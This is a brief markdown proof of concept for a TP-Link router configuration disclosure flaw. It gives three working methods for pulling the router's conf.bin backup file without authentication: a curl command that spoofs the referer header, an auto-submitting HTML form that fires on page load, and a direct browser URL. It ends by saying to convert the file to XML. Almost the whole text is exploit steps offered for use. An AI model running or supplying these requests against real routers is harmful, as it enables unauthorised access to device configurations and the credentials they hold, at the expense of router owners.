# TP_Link Configuration Disclosure

## 1. using curl
```
curl http://192.168.0.1/cgi/conf.bin -H 'referer: http://192.168.0.1' > conf.bin`
```
## 2. using html:
```
<form id="autosubmit" action="http://192.168.0.1/cgi/conf.bin" method="GET">
   <input type="hidden" name="referer" value="http://192.168.0.1">
   <input type="submit" value="Submit Request" />
</form>

<script>
 document.getElementById("autosubmit").submit();
</script>
```

## 3. Using Browser:
```
http://192.168.0.1/cgi/conf.bin?referer=http://192.168.0.1
```

## Convert bin to xml.

## NOTE: Not all router has same config path

